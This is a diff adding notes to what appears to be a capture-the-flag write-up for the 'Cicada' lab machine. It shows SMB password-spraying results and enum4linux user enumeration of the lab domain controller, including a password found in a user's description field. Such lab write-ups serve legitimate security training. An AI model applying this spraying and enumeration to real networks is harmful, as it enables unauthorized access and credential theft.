@@ -476,3 +476,55 @@ SMB         10.129.202.143  445    CICADA-DC        [-] cicada.htb\john.smoulder
 SMB         10.129.202.143  445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
 SMB         10.129.202.143  445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
 ```
+
+enum4linux as user michael.wrightson output (found password for user david.orelious: aRt$Lp#7t*VQ!3):
+```bash
+ ===================================
+|    Users via RPC on cicada.htb    |
+ ===================================
+[*] Enumerating users via 'querydispinfo'
+[+] Found 8 user(s) via 'querydispinfo'
+[*] Enumerating users via 'enumdomusers'
+[+] Found 8 user(s) via 'enumdomusers'
+[+] After merging user results we have 8 user(s) total:
+'1104':
+  username: john.smoulder
+  name: (null)
+  acb: '0x00000210'
+  description: (null)
+'1105':
+  username: sarah.dantelia
+  name: (null)
+  acb: '0x00000210'
+  description: (null)
+'1106':
+  username: michael.wrightson
+  name: (null)
+  acb: '0x00000210'
+  description: (null)
+'1108':
+  username: david.orelious
+  name: (null)
+  acb: '0x00000210'
+  description: Just in case I forget my password is aRt$Lp#7t*VQ!3
+'1601':
+  username: emily.oscars
+  name: Emily Oscars
+  acb: '0x00000210'
+  description: (null)
+'500':
+  username: Administrator
+  name: (null)
+  acb: '0x00000210'
+  description: Built-in account for administering the computer/domain
+'501':
+  username: Guest
+  name: (null)
+  acb: '0x00000214'
+  description: Built-in account for guest access to the computer/domain
+'502':
+  username: krbtgt
+  name: (null)
+  acb: '0x00020011'
+  description: Key Distribution Center Service Account
+```
